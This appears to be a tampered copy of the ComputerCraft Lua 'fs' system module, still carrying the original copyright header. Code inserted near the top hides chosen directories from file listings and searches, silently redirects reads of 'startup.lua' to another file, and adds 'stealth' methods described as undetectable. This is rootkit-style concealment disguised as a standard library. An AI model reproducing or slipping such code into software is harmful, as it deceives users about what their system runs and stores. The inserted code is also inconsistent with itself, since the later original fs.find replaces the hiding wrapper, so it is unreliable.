-- SPDX-FileCopyrightText: 2017 Daniel Ratcliffe
--
-- SPDX-License-Identifier: LicenseRef-CCPL

--- @module fs

local expect = dofile("rom/modules/main/cc/expect.lua")
local expect, field = expect.expect, expect.field

local native = fs

local fs = _ENV
for k, v in pairs(native) do fs[k] = v end

local hiddenDirs = {}
local originalStartup = "startup.lua"

-- Helper function to check if a path is hidden
local function isHidden(path)
    for _, dir in ipairs(hiddenDirs) do
        if fs.combine("", path) == fs.combine("", dir) then
            return true
        end
    end
    return false
end

-- Wrapper for fs.list to exclude hidden directories
local oldList = native.list
function fs.list(path)
    local files = oldList(path)
    local visibleFiles = {}
    for _, file in ipairs(files) do
        local fullPath = fs.combine(path, file)
        if not isHidden(fullPath) then
            table.insert(visibleFiles, file)
        end
    end
    return visibleFiles
end

-- Wrapper for fs.exists to account for hidden directories
local oldExists = native.exists
function fs.exists(path)
    if isHidden(path) then
        return true
    end
    return oldExists(path)
end

-- Wrapper for fs.isDir to account for hidden directories
local oldIsDir = native.isDir
function fs.isDir(path)
    if isHidden(path) then
        return true
    end
    return oldIsDir(path)
end

-- Redirect startup.lua checks to another file
local oldOpen = native.open
function fs.open(path, mode)
    if fs.combine("", path) == fs.combine("", "startup.lua") then
        return oldOpen(originalStartup, mode)
    end
    return oldOpen(path, mode)
end

-- Wrapper for fs.find to exclude hidden directories
local oldFind = native.find
function fs.find(pattern)
    local results = oldFind(pattern)
    local visibleResults = {}
    for _, path in ipairs(results) do
        if not isHidden(path) then
            table.insert(visibleResults, path)
        end
    end
    return visibleResults
end

-- Define new methods for hiding/unhiding directories and setting original startup
local stealthMethods = {}

stealthMethods.hideDir = function(path)
    if not fs.isDir(path) then
        error("Path is not a directory", 2)
    end
    if not isHidden(path) then
        table.insert(hiddenDirs, fs.combine("", path))
    end
end

stealthMethods.unhideDir = function(path)
    for i, dir in ipairs(hiddenDirs) do
        if fs.combine("", dir) == fs.combine("", path) then
            table.remove(hiddenDirs, i)
            return
        end
    end
end

stealthMethods.setOriginalStartup = function(path)
    if not fs.exists(path) then
        error("Specified file does not exist", 2)
    end
    originalStartup = fs.combine("", path)
end

-- Make stealth methods undetectable
setmetatable(fs, {
    __index = function(_, key)
        return nil
    end,
    __newindex = function(_, key, value)
        rawset(fs, key, value)
    end,
})

-- Attach stealth methods (still callable directly)
for name, func in pairs(stealthMethods) do
    rawset(fs, name, func)
end

--[[- Provides completion for a file or directory name, suitable for use with
@{_G.read}.
...
]]
function fs.complete(sPath, sLocation, bIncludeFiles, bIncludeDirs)
    expect(1, sPath, "string")
    expect(2, sLocation, "string")
    local bIncludeHidden = nil
    if type(bIncludeFiles) == "table" then
        bIncludeDirs = field(bIncludeFiles, "include_dirs", "boolean", "nil")
        bIncludeHidden = field(bIncludeFiles, "include_hidden", "boolean", "nil")
        bIncludeFiles = field(bIncludeFiles, "include_files", "boolean", "nil")
    else
        expect(3, bIncludeFiles, "boolean", "nil")
        expect(4, bIncludeDirs, "boolean", "nil")
    end

    bIncludeHidden = bIncludeHidden ~= false
    bIncludeFiles = bIncludeFiles ~= false
    bIncludeDirs = bIncludeDirs ~= false
    local sDir = sLocation
    local nStart = 1
    local nSlash = string.find(sPath, "[/\\]", nStart)
    if nSlash == 1 then
        sDir = ""
        nStart = 2
    end
    local sName
    while not sName do
        local nSlash = string.find(sPath, "[/\\]", nStart)
        if nSlash then
            local sPart = string.sub(sPath, nStart, nSlash - 1)
            sDir = fs.combine(sDir, sPart)
            nStart = nSlash + 1
        else
            sName = string.sub(sPath, nStart)
        end
    end

    if fs.isDir(sDir) then
        local tResults = {}
        if bIncludeDirs and sPath == "" then
            table.insert(tResults, ".")
        end
        if sDir ~= "" then
            if sPath == "" then
                table.insert(tResults, bIncludeDirs and ".." or "../")
            elseif sPath == "." then
                table.insert(tResults, bIncludeDirs and "." or "./")
            end
        end
        local tFiles = fs.list(sDir)
        for n = 1, #tFiles do
            local sFile = tFiles[n]
            if #sFile >= #sName and string.sub(sFile, 1, #sName) == sName and (
                bIncludeHidden or sFile:sub(1, 1) ~= "." or sName:sub(1, 1) == "."
            ) then
                local bIsDir = fs.isDir(fs.combine(sDir, sFile))
                local sResult = string.sub(sFile, #sName + 1)
                if bIsDir then
                    table.insert(tResults, sResult .. "/")
                    if bIncludeDirs and #sResult > 0 then
                        table.insert(tResults, sResult)
                    end
                else
                    if bIncludeFiles and #sResult > 0 then
                        table.insert(tResults, sResult)
                    end
                end
            end
        end
        return tResults
    end

    return {}
end

local function find_aux(path, parts, i, out)
    local part = parts[i]
    if not part then
        if fs.exists(path) then out[#out + 1] = path end
    elseif part.exact then
        return find_aux(fs.combine(path, part.contents), parts, i + 1, out)
    else
        if not fs.isDir(path) then return end

        local files = fs.list(path)
        for j = 1, #files do
            local file = files[j]
            if file:find(part.contents) then find_aux(fs.combine(path, file), parts, i + 1, out) end
        end
    end
end

local find_escape = {
    ["^"] = "%^", ["$"] = "%$", ["("] = "%(", [")"] = "%)", ["%"] = "%%",
    ["."] = "%.", ["["] = "%[", ["]"] = "%]", ["+"] = "%+", ["-"] = "%-",
    ["*"] = ".*",
    ["?"] = ".",
}

function fs.find(pattern)
    expect(1, pattern, "string")

    pattern = fs.combine(pattern)

    if pattern == ".." or pattern:sub(1, 3) == "../" then
        error("/" .. pattern .. ": Invalid Path", 2)
    end

    if not pattern:find("[*?]") then
        if fs.exists(pattern) then return { pattern } else return {} end
    end

    local parts = {}
    for part in pattern:gmatch("[^/]+") do
        if part:find("[*?]") then
            parts[#parts + 1] = {
                exact = false,
                contents = "^" .. part:gsub(".", find_escape) .. "$",
            }
        else
            parts[#parts + 1] = { exact = true, contents = part }
        end
    end

    local out = {}
    find_aux("", parts, 1, out)
    return out
end

function fs.isDriveRoot(sPath)
    expect(1, sPath, "string")
    return fs.getDir(sPath) == ".." or fs.getDrive(sPath) ~= fs.getDrive(fs.getDir(sPath))
end
